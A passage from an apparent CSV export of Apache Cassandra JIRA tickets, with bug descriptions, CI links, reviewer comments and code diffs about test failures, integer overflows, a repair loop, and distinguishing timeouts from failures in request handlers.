Regarding the circle runs it seems sthg went wrong failing most of your runs.;;;","29/Nov/22 17:21;yifanc;[~bereng], you are right. Thank you for updating the ticket state! I will take care of the CI runs. ;;;","30/Nov/22 05:13;yifanc;The CI runs of cssandra-4.1 and trunk based branches show green result.
The runs of the other branches have failures. Some of them are flaky, and some of them also appear in the Jenkins build results (on https://ci-cassandra.apache.org). 
All of the failures are not related with the changes added in this patch. Other pairs of eyes will appreciated! 

Regarding the changes, on the 4.x branches, they are identical. They are simply cherry-picked from the commits in the patch against trunk. 
On the 3.x branches, minimal change was made to check the functions names during `prepare` of the statements, instead of in the `apply` method in the trunk patch. I'd consider the commits are also identical to the original one. 
cc: [~bereng];;;","30/Nov/22 07:21;bereng;[~yifanc] 4.0 looks fishy I wouldn't expect so many failures at all. It's quite a stable branch and failures don't align at all with jenkins. Would it be ok to re-run or re-check all is ok? Also, why your circle runs don't show the 'pre-commit' and 'separate' group of tests the std circle files have? Otherwise I'd have to checked no test has been missed.;;;","30/Nov/22 20:54;yifanc;[~bereng], sure thing! I re-run the tests for 4.0. The result looks much better. The prior errors were probably due to resources. 

The CircleCI config was modified a bit. It is the equivalent of 'pre-commit'. ;;;","02/Dec/22 10:43;bereng;Hi [~yifanc] The 4.0 CI run looks much better now. The compact storage failure is a known one. Also the PRs look ok.

But checking your CI runs I see they are not equivalent to the 'pre-commit' present in our circle files. You are missing all the j11 tests under the j8 section i.e. Could we stick to the provided circle file or are there any special needs you need to modify the file for? I am asking bc having to check the list of jobs matching the 'official' circle file is an eye watering exercise.;;;","02/Dec/22 19:05;yifanc;The circleCI config was modified for convenience and efficiency, e.g. no need to click to approve the workflows. Running j11 test with the j8 built artifacts is less concerning. However, I just restored the CI configs to the provided one in tree for all 4.x branches and triggered new runs. 

--- Update ---

[~bereng], the results are mostly green.  ;;;","05/Dec/22 07:20;bereng;Hi [~yifanc],

thanks for resubmitting it. Iirc you only need one approval for the pre-commit workflow. It's mostly green but for a few in 4.1 and trunk which really sound like flakies to me. I would still open a ticket for the {{test_cleanup}} one and any other one you might consider worth it. But otherwise LGTM +1.;;;","06/Dec/22 03:02;yifanc;Committed in to cassandra-3.0 as [473656c1d53|https://github.com/apache/cassandra/commit/473656c1d53edb998aa60d414221e397797de52b] and merged up to trunk.;;;","06/Dec/22 16:39;yifanc;Created a ticket CASSANDRA-18098 for `test_cleanup`;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix Python DTest replace_address_test.TestReplaceAddress.test_replace_active_node,CASSANDRA-17847,13478038,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,e.dimitrova,e.dimitrova,22/Aug/22 15:24,22/Aug/22 21:44,13/Jul/23 08:40,22/Aug/22 21:44,5.0,,,,,,CI,,,,0,,"h4. replace_address_test.TestReplaceAddress.test_replace_active_node is failing after CASSANDRA-17805 on trunk. 
{code:java}
Error Message
test teardown failure

Stacktrace
Unexpected error found in node logs (see stdout for full details). Errors: [[replacement] 'ERROR [main] 2022-08-16 00:38:01,101 StorageService.java:1871 - Unable to replace node for token=-1586450498160569396. The node is reporting as alive with updateTimestamp=2512188286649176, allowedDelay=2512179515884926']
{code}
[https://ci-cassandra.apache.org/job/Cassandra-trunk/1270/testReport/dtest-large.replace_address_test/TestReplaceAddress/test_replace_active_node]

 ",,dcapwell,e.dimitrova,frankgh,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17805,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Aug 22 21:44:55 UTC 2022,,,,,,,All,,,,"0|z17ys0:",9223372036854775807,,,,brandon.williams,dcapwell,frankgh,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/dad3e86dfe73ae1ba4aa5a23cf8194bed3f46322,,,,,,,,,run CI,,,,,"22/Aug/22 15:28;e.dimitrova;CC [~frankgh], [~dcapwell] , [~brandon.williams]  ;;;","22/Aug/22 16:23;brandon.williams;I think we just need to ignore the newly added error message before the exception.  [Branch|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17847], [100 runs|https://app.circleci.com/pipelines/github/driftx/cassandra/595/workflows/0abdfb3d-8fb1-4818-9c42-cea4ace8fdc8/jobs/6969].;;;","22/Aug/22 18:17;frankgh;ah yes, adding it in {{dtests}} now;;;","22/Aug/22 20:10;frankgh;[~brandon.williams], I didn't realize you already had a branch for it :), I ended up adding the same thing. +1 from me ;;;","22/Aug/22 20:36;dcapwell;+1;;;","22/Aug/22 21:44;brandon.williams;Committed, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix test/distributed/org/apache/cassandra/distributed/test/IncRepairCoordinatorErrorTest,CASSANDRA-17843,13477674,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,smiklosovic,e.dimitrova,e.dimitrova,19/Aug/22 21:39,05/Oct/22 22:22,13/Jul/23 08:40,22/Aug/22 17:19,4.1-beta1,5.0,,,,,CI,,,,0,,"test/distributed/org/apache/cassandra/distributed/test/IncRepairCoordinatorErrorTest

needs to be fixed on 4.1 and trunk

[https://app.circleci.com/pipelines/github/yifan-c/cassandra/394/workflows/0079ce49-a851-4bf9-b6cd-3f9b76e9667c/jobs/3786/tests#failed-test-0]
{code:java}
java.lang.ClassCastException: class org.apache.cassandra.utils.TimeUUID cannot be cast to class java.util.UUID (org.apache.cassandra.utils.TimeUUID is in unnamed module of loader 'app'; java.util.UUID is in module java.base of loader 'bootstrap') at org.apache.cassandra.distributed.test.IncRepairCoordinatorErrorTest.errorTest(IncRepairCoordinatorErrorTest.java:50) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43){code}",,e.dimitrova,jmckenzie,smiklosovic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17834,,,,,,,,,,,,,,,,,,,,CASSANDRA-17677,,,,,,,,,,,,0.0,smiklosovic,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Aug 22 17:04:02 UTC 2022,,,,,,,All,,,,"0|z17wjk:",9223372036854775807,,,,jmckenzie,smiklosovic,,,Normal,,4.1-beta,,https://github.com/apache/cassandra/commit/f4deef9d58f739370d07cec6cc898087df560eca,,,,,,,,,fixed jvm dtest test,,,,,"20/Aug/22 13:07;smiklosovic;trunk: [https://github.com/apache/cassandra/pull/1803]

4.1 [https://github.com/apache/cassandra/pull/1802]

build trunk: [https://app.circleci.com/pipelines/github/instaclustr/cassandra/1222/workflows/283f03b5-702a-47a0-8a8f-f3eec1351524]

build 4.1: [https://app.circleci.com/pipelines/github/instaclustr/cassandra/1220/workflows/c15b13a6-1d58-444a-a8f0-6e278ce2b616];;;","22/Aug/22 16:54;jmckenzie;nit: import ordering on 4.1 branch

Otherwise +1.;;;","22/Aug/22 17:04;smiklosovic;sure, will be done on merge, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
IndexOutOfBoundsException in Paging State Version Inference (V3 State Received on V4 Connection),CASSANDRA-17840,13477650,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jmckenzie,jmckenzie,jmckenzie,19/Aug/22 17:10,06/Oct/22 15:31,13/Jul/23 08:40,24/Aug/22 19:28,3.11.14,4.0.6,4.1-beta1,5.0,,,Messaging/Client,,,,0,,"In {{PagingState.java}}, {{index}} is an integer field, and we add long values to it without a {{Math.toIntExact}} check. While we’re checking for negative return values returned by {{getUnsignedVInt}}, there's a chance that the value returned by it is so large that addition operation would cause integer overflow, or the value itself is large enough to cause overflow.",,jmckenzie,samt,tsteinmaurer,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jmckenzie,,,,,,,,,,,,,,Degradation -> Other Exception,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Sep 06 05:47:39 UTC 2022,,,,,,,All,,,,"0|z17we8:",9223372036854775807,,,,samt,,,,Low,,3.11.0,,"https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=ab481be81da0f06a80e099ca7502b7453ff568d3",,,,,,,,,New unit testing,,,,,"23/Aug/22 19:15;jmckenzie;||Item|Link||
|3.11 branch|[Link|https://github.com/apache/cassandra/compare/trunk...josh-mckenzie:cassandra:CASSANDRA-17840/3.11?expand=1]|
|3.11 CI|[Link|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/284/workflows/103b3337-4ebd-4d3b-a7fb-e9628a535168]|
|trunk branch|[Link|https://github.com/josh-mckenzie/cassandra/commit/8545d2e79ff4d2aa70962275da7e78793a7a0f59]|
|trunk CI|[Link|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/282/workflows/5858fe05-961f-43e0-ab0f-fe06fdec06d0]|

Patch merges cleanly from 4.0 -> trunk. Have some 3.11 specific things for the unit test; will probably apply there, apply 4.0 -s ours, and then merge up to trunk.
;;;","24/Aug/22 11:28;samt;LGTM. The test failures on the 3.11 branch are unrelated and/or unreproducible locally.;;;","06/Sep/22 05:47;tsteinmaurer;Any chance this is similar, also fixes CASSANDRA-17507?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Out of range exception on column index downsampling,CASSANDRA-17839,13477648,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jmckenzie,jmckenzie,jmckenzie,19/Aug/22 17:06,23/Aug/22 16:22,13/Jul/23 08:40,23/Aug/22 16:22,5.0,,,,,,Observability/Metrics,,,,0,,"We've seen a histogram overflow exception in the wild; an IllegalArgumentException w/{{{}Out of range{}}} on {{{}Ints.checkedCast{}}}. Looks like we need to tune the {{defaultPartitionSizeHistogram}} a bit and be more graceful about handling and degrading gracefully in {{SegmentedFile}}",,jmckenzie,marcuse,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jmckenzie,,,,,,,,,,,,,,Degradation -> Other Exception,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Aug 23 08:14:51 UTC 2022,,,,,,,All,,,,"0|z17wds:",9223372036854775807,,,,marcuse,,,,Low,,4.0,,"https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=0e855c4b7c157b7ba63bb7377bc441260d76556f",,,,,,,,,No new testing needed,,,,,"22/Aug/22 18:33;jmckenzie;[PR|https://github.com/apache/cassandra/pull/1806]
[JDK11 CI|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/280/workflows/b5127c76-6702-449a-a01c-e4a97cd055e8]

Trivial logging and overflow reset change; no need to run 11 and 8 both.;;;","23/Aug/22 08:14;marcuse;+1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Repair coordinator can get stuck in an infinite loop if it gets a FailSession after it's marked a session FINALIZED,CASSANDRA-17834,13477464,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jmckenzie,jmckenzie,jmckenzie,18/Aug/22 16:52,05/Oct/22 22:22,13/Jul/23 08:40,22/Aug/22 16:52,4.0.6,4.1-beta1,5.0,,,,Consistency/Repair,,,,0,,If the repair coordinator gets a FailSession message after it has marked the session as FINALIZED it will start an infinite loop of FailSession messages. This is unique to 4.0+ in {{CoordinatorSession.java}},,dcapwell,e.dimitrova,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17843,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jmckenzie,,,,,,,,,,,,,,Degradation -> Other Exception,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Aug 19 21:40:55 UTC 2022,,,,,,,All,,,,"0|z17v8w:",9223372036854775807,,,,dcapwell,,,,Low,,4.0,,"https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=0353df7542dbdbb1140a72899666e4587e87a083",,,,,,,,,New distributed testing to illustrate behavior and fix,,,,,"18/Aug/22 17:17;jmckenzie;||Item|Link|
|4.0 PR|[link|https://github.com/apache/cassandra/pull/1798]|
|4.0 branch JDK8 CI|[link|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/274/workflows/9fd695aa-2af0-4cd9-80df-89ace6715748]|
|Merged to trunk JDK11 CI|[link|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/276/workflows/3cdb6bc4-1830-4e6f-bc06-cd5f28958159]|

The patch is relatively small and merges up cleanly through 4.1 and trunk so probably not worth it to run the entire matrix of tests on all JDK's against all branches.;;;","18/Aug/22 18:55;dcapwell;+1;;;","19/Aug/22 21:38;e.dimitrova;Unfortunately 4.1 and trunk have diverged from 4.0 a lot in the past year. The new test is failing on both branches. 

[~jmckenzie], [~dcapwell] , can you, please, take a look?;;;","19/Aug/22 21:40;e.dimitrova;Ticket opened - CASSANDRA-17843;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Read/Write/Truncate throw RequestFailure in a race condition with callback timeouts, should return Timeout instead",CASSANDRA-17828,13477289,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dcapwell,dcapwell,dcapwell,17/Aug/22 18:46,29/Aug/22 14:15,13/Jul/23 08:40,20/Aug/22 01:18,5.0,,,,,,Consistency/Coordination,,,,0,,"There is an edge case with write timeout where the condition gets signaled on the timeouts and this happens before await times out, this triggers us to send a Failure rather than a Timeout
",,dcapwell,maedhroz,,,,,,,,,,,,,"dcapwell commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r948338670


##########
src/java/org/apache/cassandra/service/reads/ReadCallback.java:
##########
@@ -120,6 +120,18 @@ public void awaitResults() throws ReadFailureException, ReadTimeoutException
          */
         int received = resolver.responses.size();
         boolean failed = failures > 0 && (blockFor > received || !resolver.isDataPresent());
+        // If all messages came back as a TIMEOUT then signaled=true and failed=true.
+        // Need to distigues between a timeout and a failure (network, bad data, etc.), so store an extra field timeout
+        // to say that most failures were actually a timeout
+        // see CASSANDRA-17828
+        boolean timedout = false;
+        if (failed)
+        {
+            // is it actually a timeout?
+            long numTimeout = failureReasonByEndpoint.values().stream().filter(RequestFailureReason.TIMEOUT::equals).count();
+            long nonTimeout = failures - numTimeout;
+            timedout = nonTimeout > numTimeout;

Review Comment:
   should write use the same logic?  it would be good to be consistent I guess...



;17/Aug/22 19:35;githubbot;600","dcapwell commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r948448769


##########
src/java/org/apache/cassandra/service/TruncateResponseHandler.java:
##########
@@ -61,24 +62,36 @@ public TruncateResponseHandler(int responseCount)
     public void get() throws TimeoutException
     {
         long timeoutNanos = getTruncateRpcTimeout(NANOSECONDS) - (nanoTime() - start);
-        boolean completedInTime;
+        boolean signaled;
         try
         {
-            completedInTime = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
+            signaled = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
         }
         catch (InterruptedException e)
         {
             throw new UncheckedInterruptedException(e);
         }
 
-        if (!completedInTime)
-        {
+        if (!signaled)
             throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");
-        }
 
-        if (truncateFailingReplica != null)
+        if (!failureReasonByEndpoint.isEmpty())
         {
-            throw new TruncateException(""Truncate failed on replica "" + truncateFailingReplica);
+            int size = failureReasonByEndpoint.size();
+            long timeouts = failureReasonByEndpoint.values().stream().filter(RequestFailureReason.TIMEOUT::equals).count();
+            long nonTimeout = size - timeouts;
+            if (nonTimeout <= timeouts)
+            {
+                throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");
+            }
+            else
+            {
+                StringBuilder sb = new StringBuilder(""Truncate failed on replicas "");
+                for (Map.Entry<InetAddressAndPort, RequestFailureReason> e : failureReasonByEndpoint.entrySet())
+                    sb.append(e.getKey()).append(' ').append(e.getValue()).append("", "");
+                sb.setLength(sb.length() - 2);
+                throw new TruncateException(sb.toString());

Review Comment:
   this change is causing test failures... switching from `replica` to `replicas` and now including the reason... wondering if I should keep the old logic; just log 1



;17/Aug/22 21:38;githubbot;600","dcapwell commented on code in PR #200:
URL: https://github.com/apache/cassandra-dtest/pull/200#discussion_r948528084


##########
cql_test.py:
##########
@@ -796,7 +796,7 @@ def test_truncate_failure(self):
             thrown = True
 
         assert thrown, ""No exception has been thrown""
-        assert re.search(""Truncate failed on replica /127.0.0.3"", str(exception)) is not None
+        assert re.search(""Truncate failed on replicas? /127.0.0.3"", str(exception)) is not None

Review Comment:
   ```
   >>> import re
   >>> re.search('Truncate failed on replica /127.0.0.3', 'Truncate failed on replica /127.0.0.3')
   <re.Match object; span=(0, 37), match='Truncate failed on replica /127.0.0.3'>
   >>> re.search('Truncate failed on replicas /127.0.0.3', 'Truncate failed on replica /127.0.0.3')
   >>> re.search('Truncate failed on replicas? /127.0.0.3', 'Truncate failed on replica /127.0.0.3')
   <re.Match object; span=(0, 37), match='Truncate failed on replica /127.0.0.3'>
   >>> re.search('Truncate failed on replicas? /127.0.0.3', 'Truncate failed on replicas /127.0.0.3 UNKNOWN')
   <re.Match object; span=(0, 38), match='Truncate failed on replicas /127.0.0.3'>
   ```



;17/Aug/22 23:35;githubbot;600","maedhroz commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950390901


##########
test/distributed/org/apache/cassandra/distributed/test/metrics/RequestTimeoutTest.java:
##########
@@ -0,0 +1,191 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test.metrics;
+
+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.concurrent.TimeUnit;
+import java.util.concurrent.TimeoutException;
+import java.util.concurrent.atomic.AtomicInteger;
+
+import org.junit.AfterClass;
+import org.junit.Before;
+import org.junit.BeforeClass;
+import org.junit.Test;
+
+import net.bytebuddy.ByteBuddy;
+import net.bytebuddy.dynamic.loading.ClassLoadingStrategy;
+import net.bytebuddy.implementation.MethodDelegation;
+import net.bytebuddy.implementation.bind.annotation.SuperMethod;
+import net.bytebuddy.implementation.bind.annotation.This;
+import org.apache.cassandra.config.Config;
+import org.apache.cassandra.cql3.statements.BatchStatement;
+import org.apache.cassandra.distributed.Cluster;
+import org.apache.cassandra.distributed.api.ConsistencyLevel;
+import org.apache.cassandra.distributed.test.TestBaseImpl;
+import org.apache.cassandra.utils.AssertionUtils;
+import org.apache.cassandra.exceptions.CasWriteTimeoutException;
+import org.apache.cassandra.exceptions.ReadTimeoutException;
+import org.apache.cassandra.exceptions.WriteTimeoutException;
+import org.apache.cassandra.net.Verb;
+import org.apache.cassandra.service.paxos.Paxos;
+import org.apache.cassandra.utils.concurrent.Awaitable;
+import org.apache.cassandra.utils.concurrent.Condition;
+import org.assertj.core.api.Assertions;
+
+import static net.bytebuddy.matcher.ElementMatchers.named;
+import static net.bytebuddy.matcher.ElementMatchers.takesArguments;
+import static org.apache.cassandra.utils.AssertionUtils.isThrowable;
+
+public class RequestTimeoutTest extends TestBaseImpl
+{
+    private static AtomicInteger NEXT = new AtomicInteger(0);

Review Comment:
   nit: could be `final`



;19/Aug/22 16:52;githubbot;600","maedhroz commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950399601


##########
src/java/org/apache/cassandra/service/TruncateResponseHandler.java:
##########
@@ -61,24 +63,34 @@ public TruncateResponseHandler(int responseCount)
     public void get() throws TimeoutException
     {
         long timeoutNanos = getTruncateRpcTimeout(NANOSECONDS) - (nanoTime() - start);
-        boolean completedInTime;
+        boolean signaled;
         try
         {
-            completedInTime = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
+            signaled = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
         }
         catch (InterruptedException e)
         {
             throw new UncheckedInterruptedException(e);
         }
 
-        if (!completedInTime)
-        {
+        if (!signaled)
             throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");
-        }
 
-        if (truncateFailingReplica != null)
+        if (!failureReasonByEndpoint.isEmpty())
         {
-            throw new TruncateException(""Truncate failed on replica "" + truncateFailingReplica);
+            // clone to make sure no race condition happens
+            Map<InetAddressAndPort, RequestFailureReason> failureReasonByEndpoint = new HashMap<>(this.failureReasonByEndpoint);
+            int size = failureReasonByEndpoint.size();
+            long timeouts = failureReasonByEndpoint.values().stream().filter(RequestFailureReason.TIMEOUT::equals).count();
+            long nonTimeout = size - timeouts;
+            if (nonTimeout <= timeouts)
+                throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");
+
+            StringBuilder sb = new StringBuilder(""Truncate failed on "");
+            for (Map.Entry<InetAddressAndPort, RequestFailureReason> e : failureReasonByEndpoint.entrySet())
+                sb.append(""replica "").append(e.getKey()).append(' ').append(e.getValue()).append("", "");

Review Comment:
   nit: maybe a color after the address would be helpful?
   ```suggestion
                   sb.append(""replica "").append(e.getKey()).append(': ').append(e.getValue()).append("", "");
   ```



;19/Aug/22 17:00;githubbot;600","maedhroz commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950403192


##########
src/java/org/apache/cassandra/service/TruncateResponseHandler.java:
##########
@@ -61,24 +63,34 @@ public TruncateResponseHandler(int responseCount)
     public void get() throws TimeoutException
     {
         long timeoutNanos = getTruncateRpcTimeout(NANOSECONDS) - (nanoTime() - start);
-        boolean completedInTime;
+        boolean signaled;
         try
         {
-            completedInTime = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
+            signaled = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
         }
         catch (InterruptedException e)
         {
             throw new UncheckedInterruptedException(e);
         }
 
-        if (!completedInTime)
-        {
+        if (!signaled)
             throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");
-        }
 
-        if (truncateFailingReplica != null)
+        if (!failureReasonByEndpoint.isEmpty())
         {
-            throw new TruncateException(""Truncate failed on replica "" + truncateFailingReplica);
+            // clone to make sure no race condition happens
+            Map<InetAddressAndPort, RequestFailureReason> failureReasonByEndpoint = new HashMap<>(this.failureReasonByEndpoint);
+            int size = failureReasonByEndpoint.size();
+            long timeouts = failureReasonByEndpoint.values().stream().filter(RequestFailureReason.TIMEOUT::equals).count();
+            long nonTimeout = size - timeouts;
+            if (nonTimeout <= timeouts)
+                throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");

Review Comment:
   What if instead of just throwing a `TimeoutException` when there are more timeouts than non-timeouts (okay >=), we just get rid of what's between lines 83 and 88 here? (i.e. We just throw a `TruncateException` with the per-endpoint failure summary snapshot, unless perhaps every single one of the failure reasons is TIMEOUT?)



##########
src/java/org/apache/cassandra/service/TruncateResponseHandler.java:
##########
@@ -61,24 +63,34 @@ public TruncateResponseHandler(int responseCount)
     public void get() throws TimeoutException
     {
         long timeoutNanos = getTruncateRpcTimeout(NANOSECONDS) - (nanoTime() - start);
-        boolean completedInTime;
+        boolean signaled;
         try
         {
-            completedInTime = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
+            signaled = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
         }
         catch (InterruptedException e)
         {
             throw new UncheckedInterruptedException(e);
         }
 
-        if (!completedInTime)
-        {
+        if (!signaled)
             throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");
-        }
 
-        if (truncateFailingReplica != null)
+        if (!failureReasonByEndpoint.isEmpty())
         {
-            throw new TruncateException(""Truncate failed on replica "" + truncateFailingReplica);
+            // clone to make sure no race condition happens
+            Map<InetAddressAndPort, RequestFailureReason> failureReasonByEndpoint = new HashMap<>(this.failureReasonByEndpoint);
+            int size = failureReasonByEndpoint.size();
+            long timeouts = failureReasonByEndpoint.values().stream().filter(RequestFailureReason.TIMEOUT::equals).count();
+            long nonTimeout = size - timeouts;
+            if (nonTimeout <= timeouts)
+                throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");

Review Comment:
   What if instead of throwing a `TimeoutException` when there are more timeouts than non-timeouts (okay >=), we just get rid of what's between lines 83 and 88 here? (i.e. We just throw a `TruncateException` with the per-endpoint failure summary snapshot, unless perhaps every single one of the failure reasons is TIMEOUT?)



;19/Aug/22 17:04;githubbot;600","maedhroz commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950403192


##########
src/java/org/apache/cassandra/service/TruncateResponseHandler.java:
##########
@@ -61,24 +63,34 @@ public TruncateResponseHandler(int responseCount)
     public void get() throws TimeoutException
     {
         long timeoutNanos = getTruncateRpcTimeout(NANOSECONDS) - (nanoTime() - start);
-        boolean completedInTime;
+        boolean signaled;
         try
         {
-            completedInTime = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
+            signaled = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
         }
         catch (InterruptedException e)
         {
             throw new UncheckedInterruptedException(e);
         }
 
-        if (!completedInTime)
-        {
+        if (!signaled)
             throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");
-        }
 
-        if (truncateFailingReplica != null)
+        if (!failureReasonByEndpoint.isEmpty())
         {
